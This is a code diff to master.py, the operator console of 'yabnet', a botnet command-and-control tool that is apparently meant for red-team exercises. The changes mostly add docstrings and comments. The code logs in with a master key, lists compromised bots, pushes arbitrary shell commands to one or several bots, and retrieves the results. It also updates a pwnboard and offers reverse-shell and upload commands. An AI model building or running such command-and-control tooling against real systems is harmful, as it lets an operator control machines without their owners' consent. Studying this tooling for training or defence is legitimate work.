@@ -21,12 +21,26 @@ from cmd2 import ansi
 
 import generator
 
+
+"""
+Name: master.py
+Description: Master console for yabnet. 
+The master console is separated from yabnet server for opsec and efficiency reasons. 
+
+"""
+
 # Timer to check the agent's result. The golang agent calls back randomly between 30~50 seconds, so we check 
 # around the 55 second mark. Very janky, very hardcoding indeed. Hopefully I find a better way around this... 
 TIMER = '55'
 TIMER_INT = 55
 
 def refresh():
+    """
+    Description: Regularly hit yabnet server's /refresh endpoint to update server's database. 
+    Check /refresh endpoint of server.py for more information. 
+
+    This is ran as an automatic thread in the background. 
+    """
     while True:
         url = URL + '/refresh'
         try:
@@ -56,6 +70,10 @@ def print_red(string):
 
 
 def updatepwnboard(url):
+    """
+    Description: Automatic thread running in the background for updating pwnboard. 
+    Look server.py's /updatepwnboard endpoint for more information 
+    """
     while True:
         pwnboardURL = url
         yabnetEndpoint = URL + '/updatepwnboard'
@@ -69,6 +87,13 @@ def updatepwnboard(url):
         time.sleep(60)
 
 def checkPushResult(url, masterkey, target,cmd):
+    """
+    Description: A delayed thread which will hit the /bot/<botid>/result endpoint 
+    and retrieve the command's result from the server. 
+
+    The thread sleeps first, because we want to wait for the bot to report back its result
+    and then visit the server to retrieve the result. 
+    """
     time.sleep(TIMER_INT)
     endpoint = url + '/bot/' + target + '/result'
     key = masterkey 
@@ -76,8 +101,6 @@ def checkPushResult(url, masterkey, target,cmd):
     data = {'masterkey': key}
     res = requests.post(endpoint, data=data)
     res = res.json()
-
-    #print(res)
     
     print_green("\n===========================================================================")
     print_blue("[Bot_ID] - " + str(target) + " [Hostname] - " + res['bot_os'] + " [IP] - " + res['bot_ip'])
@@ -86,29 +109,18 @@ def checkPushResult(url, masterkey, target,cmd):
     print_green(res['result'])
     print_green("===========================================================================\n")
 
-    #self.poutput(output)
-
     """
                 output_success = ansi.style('[+] Retrieved Master key = ' + MASTERKEY, fg='green', bold=True)
             self.poutput(output_success
     """
-    
-#url,MASTERKEY,target
 
-async def get_result(bot_ip):
-    url = URL + '/bot/' + bot_ip + '/result'
-    masterkey = MASTERKEY 
-
-    data = {'masterkey': masterkey}
-    print("Sleeping...")
-    await asyncio.sleep(5)
-    res = requests.post(url, data=data) 
-
-    print(res.text) 
-
+# ===============================================================================
+# ====================== Start of cmd2, the actual console ======================
+# ===============================================================================
 
 class CmdLineApp(cmd2.Cmd):
 
+    # Sets command's category. These shows up when typing '?' into the console 
     CUSTOM_CATEGORY = 'My Custom Commands'
     BOT_CATEGORY = 'Bot-Control'
     OPERATION_CATEGORY = 'Operation'
@@ -244,7 +256,7 @@ ___  ___          _              _____                       _
 
     """
     Command: list 
-    Description: Retireve list of bots from the server and display it to master 
+    Description: Retireve list of bots from the server and display it to master
     """
     list_parser = argparse.ArgumentParser()
     list_parser.add_argument('-f', '--find', type=str, help='Find specific agent by ip address')
@@ -252,6 +264,8 @@ ___  ___          _              _____                       _
     @cmd2.with_category(INFORMATIONAL_CATEGORY)
     @cmd2.with_argparser(list_parser)
     def do_list(self, args):
+
+        # do_list requires Login. Yell at the user if the user is not logged in.
         try:
             if URL is None:
                 self.poutput('URL is not set!')
@@ -259,19 +273,23 @@ ___  ___          _              _____                       _
             output_loginfirst = ansi.style("\n\n<Login is Required>\n", fg='red', bg='blue', bold=True)
             self.poutput(output_loginfirst)
 
+        # If specific hostname is set, visit the /find endpoint
         if args.hostname != None:
             url = URL + '/bot/find'
             data = {'masterkey': MASTERKEY,'hostname': args.hostname}
             res = requests.post(url, data=data)
 
+        # If specific hostname is NOT set, just visit /list and show all the bots 
         else:
             url = URL + '/bot/list'
             data = {'masterkey': MASTERKEY}
             res = requests.post(url, data=data)
 
+        # No bots found in the server
         if len(res.json()) == 0:
             self.poutput(ansi.style("No bots connected with this server at the moment", fg='red', bold=True))
 
+        # Bots found in the server 
         else:
             botlist = res.json()
 
@@ -298,6 +316,9 @@ ___  ___          _              _____                       _
                 bots = bots[:-1]
                 self.poutput(ansi.style("Ex) push -t " + bots + " -c whoami\n", fg='blue', bold=True))
 
+    """
+    Description: Visit /cleanup endpoint and remove all staged commands.
+    """
     @cmd2.with_category(OPERATION_CATEGORY)
     def do_cleanup(self, args):
         try:
@@ -342,7 +363,7 @@ ___  ___          _              _____                       _
 
     """
     Command: Push 
-    Description: Push a specific command to specific bot(bots). 
+    Description: Push a specific command to specific bot or multiple bots.
     """
     push_parser = argparse.ArgumentParser()
     push_parser.add_argument('-t', '--target', type=str, help="Target bot's ID to push the command")
@@ -369,19 +390,10 @@ ___  ___          _              _____                       _
             self.poutput(res.text)
 
             # If command staging was successful, check the result page after TIMER.
-            # TODO: Make a thread here? But it failed last time so I have no idea...
             if 'result' in res.text:
-                # This "hack" was used due to lack of knowledge of asyncio. Will come back to this... 
-                #payload = "sleep " + TIMER + "; echo '\n[" + target + "] # " + args.command + "\n==========================================================\n';  curl -X POST -d 'masterkey'='" + MASTERKEY + "' " + URL + "/bot/" + target + "/result"
-                #process = Popen(payload, shell=True)
-                
                 pushThread = threading.Thread(target=checkPushResult, args=(URL,MASTERKEY,target,cmd,))
                 pushThread.daemon = True
                 pushThread.start()
-                
-                #pwnboardThread = threading.Thread(target=updatepwnboard, args=(url,))
-                #pwnboardThread.daemon = True
-                #pwnboardThread.start()
 
     """
     Command: reverse 
@@ -468,8 +480,6 @@ ___  ___          _              _____                       _
     """
     Command: upload 
     Description: Upload file from master to the server 
-
-    TODO: Implement this command 
     """
     upload_parser = argparse.ArgumentParser()
     upload_parser.add_argument('-f', '--file', type=str, help='Directory path and filename to be uploaded to the server')
